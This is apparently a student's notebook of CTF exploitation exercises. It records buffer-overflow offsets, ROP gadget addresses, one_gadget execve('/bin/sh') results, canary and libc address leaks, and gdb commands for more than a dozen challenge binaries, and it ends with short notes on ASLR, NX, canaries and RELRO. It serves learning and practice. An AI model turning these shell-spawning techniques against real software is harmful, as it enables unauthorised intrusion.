# 02 stack overflow

* [boi](https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-14-CSAW-CTF-Quals/files/boi)

    To craft the right string input with python3:

    `python3 -c 'import sys;sys.stdout.buffer.write(bytes.fromhex("eebaf3ca"))'` -> inversed because of little endianness

    exploit: `python3 boi_pwn.py`

* [pwn1](https://github.com/zst-ctf/tamuctf-2019-writeups/blob/master/Solved/Pwn1/pwn1)

    2 string comparisons ("Sir Lancelot of Camelot", "To seek the Holy Grail.") then one stack overflow.
    Look at the distance in the stack between the two pointers (0x43 and 0x18) -> 0x2b zeros to fill

* [just](https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/)
    just override the message that will be displayed in the end with a stack overflow

* [warmup](https://github.com/ctfs/write-ups-2016/blob/master/csaw-ctf-2016-quals/pwn/warmup-50/warmup)
    * hyp1: with the call to `gets` overwrite the return pointer so it calls `FUN_0040060d` which will cat the content of the flag file.

    on stopping on a breakpoint: search the input (ddd) in the memory `search-pattern ddd` and note the stack address. Then look for the return register rip `i f`. Substract both (make 0x48 in this case). `x 0x7fffffffdd08` to check the value of the return register (in this particular case).

* [getit](https://github.com/osirislab/CSAW-CTF-2018-Quals/tree/master/pwn/get_it)
    64bit
    stack addr of buffer: 0x7fffffffdc90
    return register: 0x7fffffffdce8
    -> diff : 0x28
    => 0x28 zeros and address of shell method: 0x004005b6

    but sigsev because wrong env :/ -> docker file with socat to emulate the env, thanks to the example in the link :D

* [vuln-chat](https://github.com/j3rrry/Writeups/tree/master/CTF/2017/TU/Pwn/vuln%20chat)
    32 bits
    little endian

    `printFlag` at 0x0804856b
    username at 0xffffce9f (?)
    format is %30s at 0xffffceb3-> so only 30 chars are read
    password stored at 0xffffce8b
    return pointer at 0xffffcebc
        -> delta is 49
    first overflow to overwrite fmt to have more reach
    - format - username: 20 delta

* [pilot](https://github.com/osirislab/CSAW-CTF-2017-Quals/tree/master/pwn/pilot)
    64bits
    First instance of **shellcode** exploit: we change the return address to a method we crafted.
    shellcodes can be found [here](http://shell-storm.org/shellcode/).

    (the memory addresses are supposed to change everytime):
    commandBuffer: 0x7fffffffdcc0
    rip: 0x7fffffffdce8
    => 40 of delta

* [pwn3](https://github.com/zst-ctf/tamuctf-2019-writeups/tree/master/Solved/Pwn3)
    32bit
    PIE and RELRO enabled (randomized memory offset)
    useful gef command: `disas echo`

    buffer location: 0xffffcd9e
    eip: 0xffffcecc
    => 302 of delta

* [shella-easy](https://tcode2k16.github.io/blog/posts/2018/tuctf-writeup/#shella-easy)
    32bits
    partial RELRO

    Seems like shellcode insertion, make sure to overwrite one variable with the right value.
    buffer: 0xffffce60
    eip: 0xffffceac
    -> delta 76
    value to overwrite: 0xffffcea0 (delta 64 from the buffer)

* [simplecalc](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/simple-calc-5)
    64 bits
    partial RELRO and NX

    buffer: 0x7fffffffdc90
    rip: 0x7fffffffdcd8
    => 72 of delta

    ROP exploit, need 4 registers to call sys_execve: rax (val 59, i.e. 0x3b), rdi (file to execute : ptr to "/bin/sh"), rsi (args, not needed: 0x0) and rdx (env vars, not needed: 0x0).
    To look for them search with:
    `ROPgadget --binary simplecalc | grep "pop rax ; ret"`
    (replace rax with the others)
    rax: 0x000000000044db34
    rdi: 0x0000000000401b73
    rsi: 0x0000000000401c87
    rdx: 0x0000000000437a85

    Then look for a `mov` gadget that will allow me (you ? us ?) to write onto those values: `ROPgadget --binary simplecalc | grep "mov"`:
    ```
    0x000000000044526e : mov qword ptr [rax], rdx ; ret
    ```

    Last gadget needed for syscall (`ROPgadget --binary simplecalc | grep ": syscall"`):
    ```
    0x0000000000400488 : syscall
    ```

    Now look for a place to write "/bin/sh" (`vmmap`): ~ 0x6c1000

    There is a `free` on the way to the overwrite but we can give it a null pointer.

* [speedrun-001](https://github.com/guyinatuxedo/nightmare/blob/master/modules/07-bof_static/dcquals19_speedrun1/speedrun-001)
    At this moment I realized... that the executable are just on this course's github!
    Anyway:
    64bit
    RELRO & NX
    
    0x004498a0 seems to read input with a syscall, so ROP with it as before:
    rax: `0x0000000000415664 : pop rax ; ret`
    rdi: `0x0000000000400686 : pop rdi ; ret`
    rsi: `0x00000000004101f3 : pop rsi ; ret`
    rdx: `0x00000000004498b5 : pop rdx ; ret`
    mov: `0x000000000048d251 : mov qword ptr [rax], rdx ; ret`
    syscall: `0x000000000040129c : syscall`
    heap seems empty: 0x006bc000
    location of stack: 0x7fffffffd830
    rip: 0x7fffffffdc38
        -> diff of 0x408

    note to self: `/bin/bash` **does not work** (at least for this one)

* feedme
    32bit LSB
    Intel 80386
    NX enabled

    The program forks a child process, so use this option in gdb to follow it:
    `set follow-fork-mode child` and `show follow-fork mode` to check

    `p $al` to print low bits of rax register (?)

    `si` (step into) or `ni` (next instruction) for gdb

    Canary at the method (at 0x08049036) that reads input (and displays "FEED ME!").
    e.g. : for one run -> `0xb2ef800` (x86's canary's are 4 bytes, last one being 00).
    It is at `0xffffce8c`.

    From looking at the parameter in the call to input scan, stack seems to be at `0xffffce6c` and eip `0xffffce9c` when break point at `b *0x8049069`.

    stack - eip delta : 0x30
    canary - eip delta : 0x10 (! in tutorial it is 0x20, and indeed it worked with 0x20)

    The fork is created 800 time before exiting, which are the number of time we can brute force the canary.

    Naming conventions are **different** from previous one. (eax)
    eax: `0x080bb496 : pop eax ; ret`
    edx: `0x0806f34a : pop edx ; ret`
    ecx & ebx: `0x0806f371 : pop ecx ; pop ebx ; ret`
    mov: `0x0807be31 : mov dword ptr [eax], edx ; ret`
    syscall (`int 0x80` in x86): `0x08049761 : int 0x80`
    `/bin/sh` destination: `0x80eb928`

* baby_boi

    64bit x86 little endian
    Partial RELRO & NX

    The example uses `libc-2.27.so`, but my executable seems to be using `libc-2.31.so`

    On execution it leaks an address, which is the address of the `printf` function.

    With ghidra, there does not seem to be any interesting method. -> ROP ?
    Stack overflow with a buffer of 32 bytes.

    Stack seems to have space: 0x00007ffffffdf000

    Buffer: 0x7fffffffdcb0 - 0x7fffffffdcb9
    rip: 0x7fffffffdcd8
    delta of 0x28

    Use `one_gadget libc-2.31.so` to find complete gadgets:
    ```
    0xe6c7e execve("/bin/sh", r15, r12)
    constraints:
    [r15] == NULL || r15 == NULL
    [r12] == NULL || r12 == NULL

    0xe6c81 execve("/bin/sh", r15, rdx)
    constraints:
    [r15] == NULL || r15 == NULL
    [rdx] == NULL || rdx == NULL

    0xe6c84 execve("/bin/sh", rsi, rdx)
    constraints:
    [rsi] == NULL || rsi == NULL
    [rdx] == NULL || rdx == NULL
    ```

    We'll be using the one at `0xe6c81`.

    Interesting to note that pwn contains facilities to open libraries (here `libc-2.31.so`) so we can compute the delta in the library in case it has RELRO enabled.

* svc

    64 bit LSB, dynamically linked. Canary, NX and ASLR.

    prgm takes input from user to select an option. When selecting option 1, we are able to write 0xf8 bytes into a 0xa8 buffer.

    There is a canary check at the end of the program, if we fail it we go into `__stack_chk_fail()`. To overcome it we will leak it with the call to `puts`, which stops at the first null byte. So we will only overwrite the last 0s of the canary to see it. So we give it 0xa9 zeroes, and select the second option to see the canary.

    Stack is at `0x00007fffffffdc40`
    rip at `0x7fffffffdcf8`
    -> 0xb8 of delta

    Linked with `libgcc_s.so.1`, `libm-2.31.so`, `libc-2.31.so`, `libstdc++.so.6.0.28` and `ld-2.31.so`. We'll look at `libc-2.31.so`.

    gadgets with `one_gadget` command:
    ```
    0xe6c7e execve("/bin/sh", r15, r12)
    constraints:
    [r15] == NULL || r15 == NULL
    [r12] == NULL || r12 == NULL

    0xe6c81 execve("/bin/sh", r15, rdx)
    constraints:
    [r15] == NULL || r15 == NULL
    [rdx] == NULL || rdx == NULL

    0xe6c84 execve("/bin/sh", rsi, rdx)
    constraints:
    [rsi] == NULL || rsi == NULL
    [rdx] == NULL || rdx == NULL
    ```

    Or as suggested in the tutorial, compute different offsets to different part of the exploit:
    ```
    libc base (`vmmap`):                    0x7ffff7bdf000
    puts (`p puts`):                        0x7ffff7c665a0
    system (`p system`):                    0x7ffff7c34410
    /bin/bash (`search-pattern /bin/bash`): 0x7ffff7d965aa

    offsetPuts: 0x7ffff7c665a0 - 0x7ffff7bdf000  = 0x875a0
    offsetSystem: 0x7ffff7c34410 - 0x7ffff7bdf000 = 0x55410
    offsetBinSh: 0x7ffff7d965aa - 0x7ffff7bdf000 = 0x1b75aa
    ```

    Since ASLR is enabled, we'll need to leak a libc method address, to compute the "real" address of the gadget. We'll use `puts` for that, by displaying the address of itself. Since PIE is disabled, we can look at the GOT table to look for the pointer to `puts`, since its address is not randomized.

    We can use pwn to get the addresses:
    ```
    from pwn import *
    elf = ELF('svc')
    hex(elf.symbols['puts']) # 0x4008d0
    hex(elf.got['puts']) # 0x602018
    ```

    Or on ghidra, look at the `PTR_puts_xxxxx` entry in the .got.plt table:
    ```
                        PTR_puts_00602018   XREF[1]:     puts:004008d0  
    00602018 10 30 60   addr       puts
             00 00 00 
             00 00
    ```

    We'll just need a gadget to set rdi, since it is used by `puts`:
    ```bash
    $ ROPgadget --binary svc | grep "pop rdi"
    0x0000000000400ea3 : pop rdi ; ret
    ```

* overfloat

    64bit, LSB

    Partial RELRO, NX

    Asks for a series of lat/lon coordinates. After a while it displays `Too slow, sorry !` -> fork/process ? Typing `done` seems to exit the program. Writing `done` when giving only lat coord will keep us in the loop.

    The main function will pass a buffer to `chart_course`, which will append coordinates at the end of the buffer without checking the size. The buffer used in the `chart_course` method seems to be well handled.

    Within `main` method:
    buffer at 0x00007fffffffdc90
    rip at 0x7fffffffdcc8
    -> delta of 0x38

    On my computer the executable is using `libc-2.31.so`, so with one_gadget:
    ```
    0xe6c7e execve("/bin/sh", r15, r12)
    constraints:
    [r15] == NULL || r15 == NULL
    [r12] == NULL || r12 == NULL

    0xe6c81 execve("/bin/sh", r15, rdx)
    constraints:
    [r15] == NULL || r15 == NULL
    [rdx] == NULL || rdx == NULL

    0xe6c84 execve("/bin/sh", rsi, rdx)
    constraints:
    [rsi] == NULL || rsi == NULL
    [rdx] == NULL || rdx == NULL
    ```

    We'll need an infoleak to get the right delta to add to the gadget. For that we'll use puts:
    ```
                        PTR_puts_00602020   XREF[1]:     puts:00400690  
    00602020 08 30 60   addr       puts
             00 00 00 
             00 00
    ```
    got entry: 00602020
    plt entry: 00400690
    gadget to call puts with it's got value:
    `0x0000000000400a83 : pop rdi ; ret`

    We'll do a first ROP with `chart_course` to print the puts' address.

* storytime

    64bits, LSB

    Partial RELRO, NX

    Simple overflow with a read ? -> challenge is with the infoleak !

    buffer at 0x7fffffffdc90
    rip at 0x7fffffffdcc8
    -> delta 0x38

    We'll use write for the infoleak by writing to stdout.
    write_got: 0x00601018
    write_plt: 0x004004a0

    Write parameters:
    * rdi: file descriptor -> `1`
        * Gadget: `0x0000000000400703 : pop rdi ; ret`
        * or jump to `0x00400601` since it will set rdi to 1 just before calling write
    * rsi: pointer to the buffer to write -> pointer to got write
        * gadget: `0x0000000000400701 : pop rsi ; pop r15 ; ret`
    * rdx: size to write -> 8 bytes ? last value of rdx is 400 so it is enough

    we'll use the same gadget as previous one to open a shell. -> nope, finally used `0xe6c7e` since I found a gadget to reset the necessary registers to 0.

# Notes

## Defence

### ASLR/PIE

Add a randomized offset at the beginning of memory regions.

How to circumvent [ASLR/PIE protection](https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html). The relative layout of the memory is the same (`vmmap` in gdb) even if there is a random offset. So we try to leak one address of a memory region to deduce the layout of this region (not the others).

gdb (or gef) can put a breakpoint even with pie enabled (in gef: `pie b *addr` then `pie run` instead of just `run`).

ASLR: address space randomization -> every "memory" thing will have an offset on execution. (e.g. heap, stack, libs, ...)

PIE: position independent executable -> every "binary" thing will have an offset on execution.

### nx

Non-Executable stack. Remove 'x' right from the stack (so no code execution from here).

Look for other writable region in memory for exploits.

To test the security, try in gef `j *addr` to just jump to that address. If it is at the stack and it is protected, you'll got a sigsev.

### Canary

Same with the miners' canary that stops singing when intoxicated with gaz, the canary exists to check for memory overwrite. It does so by assigning itself a random number (which two last bytes being `00`), then checking itself at the end of the execution.

Main bypass is to overwrite it with it's own value.

### RELRO

Putting some part of the memory as read only (as opposed to NX that removes the execution right).

The easiest bypass is to ignore it.

## Attack

### ROP

[Return-Oriented Programming](https://fr.wikipedia.org/wiki/Return-oriented_programming).
Exploit to bypass non-executable memory defence, by using "gadgets" (small executable memories).
Tool: https://github.com/JonathanSalwan/ROPgadget (installed with pwn tools ?)
